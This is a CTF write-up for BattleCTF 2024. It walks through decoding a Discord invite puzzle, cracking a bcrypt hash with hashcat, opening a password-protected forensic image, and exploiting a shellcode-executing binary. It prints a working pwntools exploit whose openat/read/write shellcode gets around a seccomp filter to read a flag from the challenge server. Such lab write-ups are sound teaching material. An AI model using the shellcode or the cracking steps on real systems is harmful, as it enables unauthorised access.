---
title: BattleCTF 2024
date: 2024-12-27 04:45:00 +0800
categories: [CTF, battleCTF]
tags: [writeups, jeopardy]
math: true
mermaid: true
media_subpath: /assets/posts/2024-12-27-battleCTF
image:
  path: preview.png
---

# BattleCTF 2024
Hi there, i participated in the battleCTF2024 under the name `sigsegv`. 

Here are the challenges i solved:
![Challenges Solved](https://raw.githubusercontent.com/theMcSam/battleCTF-writeups/main/battleCTF2024/images/challenges_solved.png)   

## Misc
### Rules
Upon joining the discord server and nagivating to the #announcements channel we obtain the flag.
![Rule Challenge flag](https://raw.githubusercontent.com/theMcSam/battleCTF-writeups/main/battleCTF2024/Rules/images/rules_flag.png)  
Flag: `battleCTF{HereWeGo}`

### Invite Code
This challenge was a bit tricky because many i overlooked the message in the #notification channel before the CTF began. Luckily, after sometime i discovered it.   
![Invite Code First Image](https://raw.githubusercontent.com/theMcSam/battleCTF-writeups/main/battleCTF2024/Invite%20Code/images/invite_code_discord.png) 

First thing i did was to pick up the encoded data and place it into `cyberchef`.    
![Cyber Chef Hex Data Decode](https://raw.githubusercontent.com/theMcSam/battleCTF-writeups/main/battleCTF2024/Invite%20Code/images/invite_code_cyberchef_from_hex.png)   
We can see that the data provided was a hex dump and `cyberchef` decoded it successfully resulting in a contatenation of base64 string and a link. The base64 string just leads us to the Rick Roll video in YouTube and so that isn't vert relevant.

The other link `https://bugpwn.com/invite.ini` leads us to a page where some data is hosted on the website.
![Invite .ini file](https://raw.githubusercontent.com/theMcSam/battleCTF-writeups/main/battleCTF2024/Invite%20Code/images/invite_ini_file.png)

This looks like some base64 data. We can use `cyberchef` to decode this.
![Invite .ini b64 data decoded](https://raw.githubusercontent.com/theMcSam/battleCTF-writeups/main/battleCTF2024/Invite%20Code/images/invite_ini_b64_data_decoded.png)    

From `cyberchef` i downloaded the raw binary file and run the file command on it.
```shell
mcsam@0x32:~/Desktop/ctf/AfricaBattleCTF$ file download.gz 
download.gz: gzip compressed data, last modified: Fri Oct  4 11:25:31 2024, max compression, original size modulo 2^32 1081
```

I then decided to attempt unzipping the file with gunzip. After unzipping i read the contents of the file.
```shell
mcsam@0x32:~/Desktop/ctf/AfricaBattleCTF$ gunzip download.gz 
mcsam@0x32:~/Desktop/ctf/AfricaBattleCTF$ cat download
b'\xac\xed\x00\x05t(\x83<?xml version="1.0" encoding="utf-8" standalone="no" ?>
<!DOCTYPE users SYSTEM >
<users max="81">
	<user >
		<loginname>battlectf</loginname>
		<password>$2a$12$ecui1lTmMWKRMR4jd44kfOkPx8leaL0tKChnNid4lNAbhr/YhPPxq</password>
		<4cr_encrypt>05 5F 26 74 9B 8D D7 09 49 EB 61 94 5D 07 7D 13 AA E8 75 CD 6A 1E 79 12 DA 1E 8A E7 2F 5F DB 87 E4 0D D2 13 E4 82 EE 10 AC A7 3A BF 54 B2 A4 A5 36 EA 2C 16 00 89 AE B8 22 0B F5 18 CA 03 32 C8 C6 6B 58 80 EC 70 77 6E 16 5C 56 82 6F AD 0B C5 97 69 E9 B8 4E 54 90 95 BB 4D ED 87 99 98 BF EC D4 E2 8A 0D C5 76 03 89 A6 11 AB 73 67 A0 75 AE 3C 84 B6 5D 21 03 71 B8 D9 A0 3B 62 C0 5B 12 DA 5C 91 87 19 63 02 A4 3B 04 9F E0 AD 75 3E 35 C3 FB 1B 5E CB F0 5A A7 8B DF 00 8B DC 88 24 EF F4 EE CE 5C 3B F3 20 10 C2 52 DF 57 D2 59 5E 3E 46 D0 85 10 89 AC 09 07 EF C5 EE 1D 2F 89 1D 83 51 C6 52 38 13 2A D0 20 66 6D 52 B1 93 1B 21 06 9F E5 00 B7 AB 30 EB 98 7F CB 80 17 36 16 EF 73 BB 59 60 E4 4B F0 8A BD FF 85 A1 37 5D 4E C0 91 92 F2 68 C5 20 68 A0 A7 84 EB</4cr_encrypt>
	</user>
</users>\r\n<!-- battleCTF AFRICA 2024 -->\r\n
``` 
The content of the .gz file is an XML file with some interesting fields. The `4cr_encrypt` field contains some encrypted data. I assumed that the name `4cr_encrypt` was just a wordplay of the actual enctyption scheme `rc4_encrypt`. Now that we are aware if the encyption scheme used we can attempt to decrypt it which would require a password. Luckily, we also have a password field in the XML file which is also hashed.

At this point i saved the hash to a file and attempted to crack the password with John The Ripper. After a while we obtain the password.
```shell
mcsam@0x32:~/Desktop/ctf/AfricaBattleCTF$ hashcat -m 3200 hashes ~/Downloads/rockyou.txt 
...
$2a$12$ecui1lTmMWKRMR4jd44kfOkPx8leaL0tKChnNid4lNAbhr/YhPPxq:nohara
``` 

Using this password and cyberchef i decrypted the data successfully to obtain the flag.
![Invite Code Flag Image](https://raw.githubusercontent.com/theMcSam/battleCTF-writeups/main/battleCTF2024/Invite%20Code/images/invite_code_flag.png) 
Flag: `battleCTF{pwn2live_d7c51d9effacfe021fa0246e031c63e9116d8366875555771349d96c2cf0a60b}`

## Forensics
### Do[ro x2]
This was an interesting and very simple foresics challenge where were provided with a file having a **.ad1** (`roro.ad1`) extension. After a little googling and reading i discovered that it was an **evidence file** and the `AccessData FTK Imager` tool can be used to parse it.

I quickly jumped to my windows virtual machine to download and install`AccessData FTK Imager`. After importing the evidence file `AccessData FTK Imager` asks for password.
![FTK Imager Evidence File Import](https://raw.githubusercontent.com/theMcSam/battleCTF-writeups/main/battleCTF2024/Dororo/images/FTK_imager_windows.png) 

Immediately it hit me that the name of the challenge could be a hint to the password. I then tried the password `Dororo` and viola! i obtained the flag.
![Doror Flag](https://raw.githubusercontent.com/theMcSam/battleCTF-writeups/main/battleCTF2024/Dororo/images/dororo_flag.png) 
Flag: `BattleCTF{You_d0_1t_like_4_pro_forensicator6578888}`

## Pwn
### Universe
For this pwn challenge we were proivded with a ELF binary `universe`. I run `checksec` on the file to get a security overview of the file.
![Checksec Universe](https://raw.githubusercontent.com/theMcSam/battleCTF-writeups/main/battleCTF2024/Universe/images/checksec_universe.png)  

This is an x64 little endian exucutable with NX and PIE enabled.

Next thing was to run the binary to see it's functionality before diving into any sorts of static or dynamic analysis techniques.
![Running Universe](https://raw.githubusercontent.com/theMcSam/battleCTF-writeups/main/battleCTF2024/Universe/images/running_universe.png)

After this, i opened it up in `Ghidra` to view the decompilation and better understand how the `universe` executable was working.
As always, i analyse the main function first since it is the entry point to every application.
![Ghidra Universe Main Func Decompilation](https://raw.githubusercontent.com/theMcSam/battleCTF-writeups/main/battleCTF2024/Universe/images/main_function_decompilation.png) 

We can see from the image on line 20 that the pointer **pcVar1** is dereferenced and and it's content is executed. We also observe on line 10 that **pcVar1** is a pointer to a free **0x1000** bytes of memory space. Inside the for loop on line 18 we see that data is read into **pcVar1** and the loop only breaks when the **0x1000** bytes is full. The content content of the pointer **pcVar1** is then executed.

This seems very straight forward and we can immediately see that we can execute code. There's just one small problem. The function `FUN_00101208()` is called before all this. That function contains code to block certain syscalls using `seccomp`.
![Seccomp Load](https://raw.githubusercontent.com/theMcSam/battleCTF-writeups/main/battleCTF2024/Universe/images/seccomp_load.png) 

![Seccomp Rule Add](https://raw.githubusercontent.com/theMcSam/battleCTF-writeups/main/battleCTF2024/Universe/images/seccomp_rule_add.png)    

After discovering this, i used `seccomp-tools` to get a dump of the rules applied.
![Seccomp Tools Dump](https://raw.githubusercontent.com/theMcSam/battleCTF-writeups/main/battleCTF2024/Universe/images/seccomp_tools_dump.png)    

We can see that certain `syscalls` have been blocked and as a result we would have to craft our exploit shellcode with a `syscalls` that have not been listed here. In most CTFs the goal is to obtain the flag so i started searching for alternative `syscalls` i could abuse to read files on the target and get the flag.  After some searching, i decided to go with the `openat()` `syscall` to open and read files.

Using pwntools python library i crafted an exploit.
Find exploit code here:
```python
from pwn import *

context.clear(arch="amd64")

shellcode = shellcraft.linux.openat(-1, "/flag.txt")
shellcode += shellcraft.linux.read('rax', 'rsp', 100)
shellcode += shellcraft.linux.write(1, 'rsp', 100)

assembled_shellcode = asm(shellcode)
padding_size = 4096 - len(assembled_shellcode)
payload = assembled_shellcode + b'\x90' * padding_size

def main():
    io = remote("challenge.bugpwn.com",1004)
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()
```

Upon executing this script i obtained the flag.
```shell
mcsam@0x32:~/Desktop/ctf/AfricaBattleCTF/pwn/universe$ python3 read.py 
...
Africa battleCTF 2024
By its very subject, cosmology flirts with metaphysics. Because how can we study an object from which we cannot extract ourselves? Einstein had this audacity and the Universe once again became an object of science. Without losing its philosophical dimension.
What do you think of the universe?
battleCTF{Are_W3_4l0ne_!n_7he_univ3rs3?_0e2899c65e58d028b0f553c80e5d413eeefef7af987fd4181e834ee6}
\xa3p[*] Got EOF while reading in interactive
```

Flag: `battleCTF{Are_W3_4l0ne_!n_7he_univ3rs3?_0e2899c65e58d028b0f553c80e5d413eeefef7af987fd4181e834ee6}`